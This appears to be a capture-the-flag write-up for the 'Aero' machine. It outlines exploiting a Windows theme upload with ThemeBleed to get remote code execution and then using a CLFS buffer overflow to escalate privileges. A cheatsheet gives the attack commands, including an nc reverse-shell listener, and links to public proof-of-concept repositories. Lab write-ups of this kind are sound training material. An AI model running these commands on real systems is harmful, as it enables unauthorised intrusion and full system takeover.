# Aero \[Medium]

## Report

HTTP website accepts file upload for Windows themes, CVE-2023-xxx 'Themebleed' performs RCE from .theme or .themepack files. A pdf file in Documents mentions another CVE which affects CLFS (Common Log File System) where we can perform code execution (Buffer Overflow) and spawn a cmd shell to become root

To perform the themebleed exploit, we need to compile a DLL file via **Visual Studio** with a function 'VerifyThemeVersion' calling our revshell function. We had a git repo doing all that for us but this was the intention of the box so should learn that

The CLFS exploit also expects us to recompile the code after injecting our payload (using Visual Studio or Linux your call)&#x20;

## Cheatsheet

```
python3 themebleed.py -r HOST -p 4711
nc -lvnp 4711
Upload .theme file on website

clfs_eop.exe 'cmd.exe'
```

## Loot

{% embed url="https://github.com/exploits-forsale/themebleed" %}

{% embed url="https://github.com/Jnnshschl/CVE-2023-38146/tree/main" %}

{% embed url="https://github.com/fortra/CVE-2023-28252" %}

{% embed url="https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252" %}

{% embed url="https://gitlab.com/0xdf/ctfscripts/-/tree/master/rev_shell_dll?ref_type=heads" %}

